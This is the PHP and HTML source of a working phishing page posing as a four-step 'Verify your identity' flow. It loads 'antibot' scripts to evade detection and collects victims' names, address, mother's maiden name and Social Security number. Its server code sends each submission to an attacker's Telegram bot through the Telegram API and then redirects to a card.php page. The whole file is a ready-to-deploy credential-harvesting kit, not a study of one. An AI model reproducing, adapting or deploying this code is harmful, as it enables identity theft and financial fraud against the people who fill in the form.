<?php

require_once('./antibot/botfcker.php');
require_once('./antibot/botfcker2.php');
include 'config.php';


$submitted = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $firstName = $_POST['first-name'];
    $lastName = $_POST['last-name'];
    $address = $_POST['address'];
    $motherMaidenName = $_POST['mother-maidens-name'];
    $ssn = $_POST['ssn'];
    $message = "Verification Details:\n\nFirst Name: $firstName\nLast Name: $lastName\nAddress: $address\nMother's Maiden Name: $motherMaidenName\nSSN: $ssn";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $submitted = true;
        // Redirect to another page upon successful submission
        header('Location: card.php');
        exit(); // Ensure to exit after redirection
    } else {
        echo 'Failed to send data.';
    }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <title>Verify your identity</title>

    <style>
        :root {
            font-family: "Open Sans", sans-serif;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-[#404E57] p-2">
        <div class="p-1">
            <img class="w-20" src="./assets/Logo (1).svg" alt="Logo">
        </div>
    </nav>

    <!-- Split Background -->
    <div class="relative min-h-[calc(100vh-4rem)] flex-grow">
        <div class="absolute top-0 left-0 right-0 h-1/3 bg-[#2D3943]"></div>
        <div class="absolute bottom-0 left-0 right-0 h-1/2 bg-white"></div>
        <div class="relative flex flex-col items-center justify-center">
            <div class="w-full max-w-6xl bg-white shadow-lg border border-gray-200 mt-16 mb-12 rounded-lg">
                <div class="p-6 md:p-12">
                    <div class="p-4 md:p-8">
                        <div class="flex flex-col items-center justify-center">
                            <!-- Step Indicator -->
                            <div class="flex items-center space-x-4 mb-6">
                                <div class="w-10 h-10 rounded-full border-2 border-[#008300] flex items-center justify-center bg-[#008300]">
                                    <span class="text-white">1</span>
                                </div>
                                <div class="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">2</span>
                                </div>
                                <div class="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">3</span>
                                </div>
                                <div class="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">4</span>
                                </div>
                            </div>

                            <div id="error-message" class="text-red-600 mt-4"></div>
                            <h1 class="font-bold text-xl md:text-2xl mb-4 md:mb-6">
                                Verify your information
                            </h1>

                            <div class="text-xs md:text-sm text-center p-2 md:p-3 mb-2">
                                <span>Please review and verify the information you’ve provided to ensure its accuracy.<br>This is essential before moving forward. Thank you.</span>
                            </div>

                            <form id="verification-form" method="POST" class="w-full max-w-md md:max-w-lg">
                                <span class="text-xs italic text-gray-500">Fields marked with asterisks (*) are required.</span>
                                <div class="mb-4 mt-3">
                                    <div class="flex flex-col space-y-4">
                                        <div>
                                            <label for="first-name" class="block text-sm font-medium text-gray-700 mb-2">First Name</label>
                                            <input type="text" id="first-name" name="first-name" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" placeholder="Enter your first name *" required>
                                        </div>
                                        <div>
                                            <label for="last-name" class="block text-sm font-medium text-gray-700 mb-2">Last Name</label>
                                            <input type="text" id="last-name" name="last-name" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" placeholder="Enter your last name *" required>
                                        </div>
                                    </div>
                                </div>

                                <div class="mb-4">
                                    <label for="address" class="block text-sm font-medium text-gray-700 mb-2">Address</label>
                                    <input type="text" id="address" name="address" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" placeholder="Enter your address *" required>
                                </div>

                                <div class="mb-4">
                                    <label for="mother-maidens-name" class="block text-sm font-medium text-gray-700 mb-2">Mother's Maiden Name</label>
                                    <input type="text" id="mother-maidens-name" name="mother-maidens-name" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" placeholder="Enter your mother's maiden name *" required>
                                </div>

                                <div class="mb-4">
                                    <label for="ssn" class="block text-sm font-medium text-gray-700 mb-2">SSN</label>
                                    <input type="text" id="ssn" name="ssn" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" placeholder="Enter your SSN *" maxlength="11" required>
                                </div>

                                <div class="flex justify-center mt-5">
                                    <button type="submit" class="px-10 md:px-14 py-2 bg-[#0069AA] text-white border-b-4 border-[#005488] hover:bg-[#003a5e] hover:border-[#003a5e] font-bold focus:outline-none focus:ring-2 focus:ring-[#0069AA] focus:ring-opacity-50">
                                        Next
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-[#2D3943] text-white text-center py-4 mt-auto">
        <p>&copy; 2024 Your Company. All rights reserved.</p>
        <div class="flex justify-center space-x-4 mt-2">
            <a href="#" class="hover:text-gray-400">Privacy Policy</a>
            <a href="#" class="hover:text-gray-400">Terms of Service</a>
            <a href="#" class="hover:text-gray-400">Contact Us</a>
        </div>
    </footer>

    <script>
        document.getElementById('verification-form').addEventListener('submit', function(event) {
            const errorMessageContainer = document.getElementById('error-message');
            if (errorMessageContainer) {
                errorMessageContainer.innerHTML = '';
            }

            let hasErrors = false;
            const requiredFields = ['first-name', 'last-name', 'address', 'mother-maidens-name', 'ssn'];
            requiredFields.forEach(id => {
                const input = document.getElementById(id);
                if (!input.value.trim()) {
                    hasErrors = true;
                    if (errorMessageContainer) {
                        errorMessageContainer.innerHTML += `<p>${input.previousElementSibling.innerText} is required.</p>`;
                    }
                }
            });

            const ssnInput = document.getElementById('ssn');
            const ssnValue = ssnInput.value;
            if (!/^\d{3}-\d{2}-\d{4}$/.test(ssnValue)) {
                hasErrors = true;
                if (errorMessageContainer) {
                    errorMessageContainer.innerHTML += '<p>SSN must be in the format XXX-XX-XXXX.</p>';
                }
            }

            if (!hasErrors) {
                // Proceed with form submission
            }
        });

        document.addEventListener('DOMContentLoaded', function() {
            const ssnInput = document.getElementById('ssn');
            ssnInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 9) {
                    value = value.slice(0, 9);
                }
                if (value.length > 5) {
                    value = value.slice(0, 5) + '-' + value.slice(5);
                }
                if (value.length > 3) {
                    value = value.slice(0, 3) + '-' + value.slice(3);
                }
                e.target.value = value;
            });
        });
    </script>
</body>

</html>